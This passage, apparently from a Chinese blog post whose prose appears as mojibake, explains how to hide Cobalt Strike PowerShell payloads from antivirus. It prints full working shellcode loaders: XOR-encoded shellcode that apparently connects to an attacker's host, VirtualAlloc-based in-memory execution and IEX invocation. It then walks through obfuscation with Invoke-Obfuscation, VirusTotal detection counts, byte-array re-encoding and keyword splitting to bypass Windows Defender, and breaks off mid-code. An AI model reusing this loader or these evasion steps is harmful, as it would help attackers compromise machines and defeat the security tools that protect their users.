[System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuAPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMeXZPYiMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCgNvYWFxbHRwZnEuKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXfyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEBoNEhMVDRITFw0SEBQjIyMjIw==&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>åˆ†åˆ«ç”¨Windows Defenderæµ‹è¯•æ¯ä¸€æ®µä»£ç ï¼Œå‘ç°åœ¨<code>$var_code</code>ä¸­æŠ¥æ¯’<br>è¿›ä¸€æ­¥å¯¹<code>$var_code</code>è§£ç ï¼ˆæˆ‘æœ¬åœ°base64è§£å‡ºæ¥éƒ½æ˜¯ä¹±ç ï¼ŒæŒºæ€ªçš„ï¼‰<br>çœ‹åˆ«äººçš„ç»“æœè¯´èƒ½å¾—åˆ°ä¸€ä¸²ASCIIå­—ç¬¦ï¼Œè€ŒASCIIè§£ç åå¾—åˆ°ä¸€å †ä¹±ç ï¼Œä½†åœ¨æœ€åï¼Œå¯ä»¥å‘ç°æ”»å‡»è€…çš„IPï¼Œä¹Ÿæ²¡ä»€ä¹ˆå…¶ä»–å¯ä»¥è·å–çš„ä¿¡æ¯äº†</p><blockquote><p>æ€»çš„æ¥è¯´  powershellçš„ä¸Šçº¿æ–¹å¼å°±æ˜¯é€šè¿‡VirtualAllocåˆ†é…å†…å­˜ç„¶åæ‰§è¡ŒCSçš„shellcode,shellcodeå­˜æ”¾åœ¨äº†$var_codeå˜é‡ä¸­</p></blockquote><h2 id="powershellå…æ€"><a href="#powershellå…æ€" class="headerlink" title="powershellå…æ€"></a>powershellå…æ€</h2><h3 id="å·¥å…·çš„ä½¿ç”¨"><a href="#å·¥å…·çš„ä½¿ç”¨" class="headerlink" title="å·¥å…·çš„ä½¿ç”¨"></a>å·¥å…·çš„ä½¿ç”¨</h3><p>é€šè¿‡å¯¹ä¸Šé¢htaæ–‡ä»¶çš„åˆ†æä¹‹åï¼Œæˆ‘ä»¬çŸ¥é“Windows Defenderæ˜¯å¯¹<code>$var_code</code>è¿›è¡Œäº†æ£€æµ‹æŠ¥æ¯’ï¼Œé‚£æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯å°†è¯¥éƒ¨åˆ†è¿›è¡Œæ··æ·†å¤„ç†ï¼Œæ¥ç»•è¿‡Windows Defenderçš„æ£€æµ‹<br>è¿™é‡Œå…ˆæ¨èä¸€ä¸ªå¼€æºçš„æ··æ·†å·¥å…·<a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> ./<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1<br><span class="hljs-built_in">Invoke-Obfuscation</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®å…¶æ­¥éª¤å®‰è£…ï¼Œè¿è¡Œ</p><p><img src="https://s2.loli.net/2022/08/16/4myYitWBsOSNvoJ.png" alt="å¥½é…·ç‚«çš„ç•Œé¢"></p><p>å› ä¸ºæ²¡æœ‰ä»”ç»†å»ç ”ç©¶è¯¥å·¥å…·çš„ä½¿ç”¨æ–¹æ³•ï¼Œå°±ç›´æ¥ç”¨çš„å…¶ä»–å¤§ä½¬çš„é…ç½®<br><code>Set scriptblock &#39;final_base64payload&#39;</code> <code>COMPRESS</code> <code>1</code>,è¯¥é…ç½®å¯ä»¥ç»•è¿‡Windows Defenderï¼Œï¼ˆä¹Ÿå¯ä»¥é€‰æ‹©å…¶ä»–æ··æ·†æ–¹å¼æ¥ç»•è¿‡ä¸åŒçš„é˜²ç«å¢™ï¼‰è¯¥å·¥å…·ä¼šæ ¹æ®è¯¥é…ç½®è¾“å‡ºå¯ä»¥ç»•è¿‡Windows Defenderçš„PowerShellå‘½ä»¤<br><img src="https://s2.loli.net/2022/08/16/gSbkTOpM3fj1UCV.png"></p><p><code>Out d:payload.ps1</code>å°†å…¶è¾“å‡º<br><img src="https://s2.loli.net/2022/08/16/CyxmieSZpvrMLEc.png" alt="å¾—åˆ°payload.ps1"><br>å°†å…¶æ–°å»ºçš„æœ‰æ•ˆè½½è·æ›¿æ¢æ‰$var_codeä¸­çš„å†…å®¹ï¼ŒWindows DefenderæˆåŠŸç»•è¿‡</p><p>æ¥ç€æˆ‘ä»¬æŠŠä»–ä¸¢åˆ°<a href="https://www.virustotal.com/gui/file/1a2e0851bbae380c43881d70f41835b4a22e74ae2c2daf45593ffb764fc6e9e9?nocache=1">virustotal</a>ä¸Šçœ‹çœ‹æ•ˆæœ</p><p><img src="https://s2.loli.net/2022/08/16/yg2twhGMiqX6HuQ.png"></p><p><img src="https://s2.loli.net/2022/08/16/EC8iXIbahkVWGSm.png"><br>è™½ç„¶å¯ä»¥ç»•è¿‡ä¸€äº›å¤§å‚çš„é˜²ç«å¢™ï¼Œä¾‹å¦‚ï¼šå¾®è½¯ï¼Œè…¾è®¯ï¼ŒMcAfee<br>ä½†æ˜¯16/59 æ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªè¡Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥è¯•è¯•æ‰‹åŠ¨å…æ€</p><h3 id="äººå·¥å…æ€"><a href="#äººå·¥å…æ€" class="headerlink" title="äººå·¥å…æ€"></a>äººå·¥å…æ€</h3><p>æˆ‘ä»¬ç›´æ¥ç”¨CSç”Ÿæˆä¸€ä¸ªpowershellçš„payloadï¼Œä¸ç„¶ç”¨ä¹‹å‰htaä¸­åŒ…å«çš„è¯ï¼Œå‡ å±‚base64åˆå‹ç¼©å•¥çš„å¤ªéº»çƒ¦äº†<br>å…ˆæ¥çœ‹çœ‹æºç </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">Param ($var_module, $var_procedure)</span><br><span class="hljs-string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">Param (</span><br><span class="hljs-string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktTjiMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMV0saZCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3RsdBUXGAN3UUpHRk1XDBYNExgDbmJwYQouKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNicyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMSDRIQEQ0RERQNEREUIyMjIyM=&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸ä¹‹å‰çš„ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ æ··æ·†çš„è¿˜æ˜¯<code>$var_code</code><br>æ€è·¯æ˜¯å°†base64ç¼–ç æ¢æ‰ï¼Œå› ä¸ºbase64ç¼–ç ä¼šè¢«æ€æ‰ï¼Œæ”¹æˆbyteæ•°ç»„<br><img src="https://s2.loli.net/2022/08/16/uT4nE71YSL5rpxf.png"></p><p>è¿™å¯èƒ½å°±æ˜¯ä¼ è¯´ä¸­çš„FromBase65Stringï¼Ÿ<br>å°†<code>$var_code</code>æ”¹æ‰</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br></code></pre></td></tr></table></figure><p>ç°åœ¨å†æ‹¿åˆ°virustotalä¸Šé¢å»çœ‹çœ‹<br><img src="https://s2.loli.net/2022/08/16/WdOi26SaTtkljQG.png"></p><p>ç¦»å¤§è°±ï¼Œ32/59ä¸å¾—ä¸è¯´ï¼Œå®‰å…¨å‚å•†ä¼°è®¡ä¹Ÿæ˜¯å¤©å¤©åœ¨ç½‘ä¸Šå­¦ä¹ æ–°çš„å…æ€æ–¹å¼</p><p>è¿™é‡Œå‚è€ƒäº†Y4erå¸ˆå‚…çš„å¤„ç†æ–¹æ³•ï¼Œä¸»è¦éƒ¨åˆ†å°±æ˜¯æ›´æ”¹äº†å…³é”®å­—ï¼Œ</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dns">Set-StrictMode -Version <span class="hljs-number">2</span><br><br>$DoIt = @&#x27;<br>function func_b &#123;<br>Param ($amodule, $aprocedure)<br>$aunsafe_native_methods = ([AppDomain]<span class="hljs-number">::</span>CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-<span class="hljs-number">1</span>].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.Uns&#x27;+&#x27;afeN&#x27;+&#x27;ativeMethods&#x27;)<br>$agpa = $aunsafe_native_methods.GetMethod(&#x27;GetP&#x27;+&#x27;rocAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))<br>return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($amodule)))), $aprocedure))<br>&#125;<br><br>function func_a &#123;<br>Param (<br>[Parameter(Position = <span class="hljs-number">0</span>, Mandatory = $True)] [Type[]] $aparameters,<br>[Parameter(Position = <span class="hljs-number">1</span>)] [Type] $areturn_type = [Void]<br>)<br><br>$atype_b = [AppDomain]<span class="hljs-number">::</span>CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;Reflect&#x27;+&#x27;edDel&#x27;+&#x27;egate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]<span class="hljs-number">::</span>Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDeleg&#x27;+&#x27;ateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])<br>$atype_b.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]<span class="hljs-number">::</span>Standard, $aparameters).SetImplementationFlags(&#x27;Runtime, 